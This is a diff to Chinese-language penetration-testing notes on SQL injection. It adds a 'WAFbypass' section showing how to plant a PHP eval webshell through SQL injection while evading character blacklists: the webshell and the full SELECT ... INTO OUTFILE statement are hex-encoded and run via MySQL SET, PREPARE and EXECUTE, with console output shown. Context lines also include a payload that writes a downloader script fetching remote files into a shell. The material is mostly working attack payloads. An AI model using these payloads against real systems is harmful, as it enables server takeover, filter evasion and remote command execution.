@@ -61,6 +61,69 @@ SQL注入漏洞(SQL injection) - 对用户请求中的输入的参数值过滤�
     * 例2 Downloader `SELECT '<? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/get.php'` 访问 `http://localhost/get.php?f=shell.php&u=http://localhost/c99.txt`
     * ...
 
+#### WAFbypass
+
+利用SQL注入写入webshell被拦截 - 如何绕过黑名单字符`'` `<` `?`
+
+步骤1. 对"php代码"进行编码转换:  hex <-> ascii
+```
+利用了数据库能够使用hex编码的特性
+
+对webshell的"php代码"进行编码转换
+
+ascii字符:
+<?php @eval($_POST['cmd']);?>
+
+编码为十六进制(hex)格式的数据: 在最前面加0x
+0x3C3F70687020406576616C28245F504F53545B27636D64275D293B3F3E
+```
+
+
+步骤2. 对"SQL语句"进行编码转换:  hex <-> ascii
+```
+利用了数据库能够使用hex编码的特性
+
+ascii字符:
+select 0x3C3F70687020406576616C28245F504F53545B27636D64275D293B3F3E from xss limit 1 into outfile 'C:/shell.php'
+
+编码为十六进制(hex)格式的数据: 在最前面加0x
+0x73656c656374203078334333463730363837303230343036353736363136433238323435463530344635333534354232373633364436343237354432393342334633452066726f6d20787373206c696d6974203120696e746f206f757466696c652027433a2f7368656c6c2e70687027
+```
+
+步骤3. 使用数据库的`set`创建变量 被"预编译语句"使用:
+```
+mysql> use xssdb;
+Database changed
+
+mysql> set @a=0x73656C6563742030783343334637303638373032303430363537363631364332
+38323435463530344635333534354232373633364436343237354432393342334633452066726F6D
+20787373206C696D6974203120696E746F206F757466696C652027433A2F7368656C6C2E70687027;
+Query OK, 0 rows affected (0.00 sec)
+
+mysql> prepare tmp from @a;
+Query OK, 0 rows affected (0.00 sec)
+Statement prepared
+
+mysql> execute tmp;
+Query OK, 1 row affected (0.00 sec)
+```
+
+预编译原理
+```
+PREPARE statement_name FROM sql_text /*定义*/ 
+EXECUTE statement_name [USING variable [,variable...]] /*填充实际变量值 执行预处理语句*/ 
+DEALLOCATE PREPARE statement_name /*删除定义*/
+
+如
+mysql> PREPARE prod FROM "INSERT INTO examlple VALUES(?,?)"; 
+mysql> SET @p='1'; 
+mysql> SET @q='2'; 
+mysql> EXECUTE prod USING @p,@q; 
+mysql> SET @name='3'; 
+mysql> EXECUTE prod USING @p,@name; 
+mysql> DEALLOCATE PREPARE prod;
+```
+
 #### 数据获取 - 二分法
 
 数据获取:自写脚本 利用SQL注入漏洞获取数据(用二分法"加速判断" 缩短数据获取所需时长)
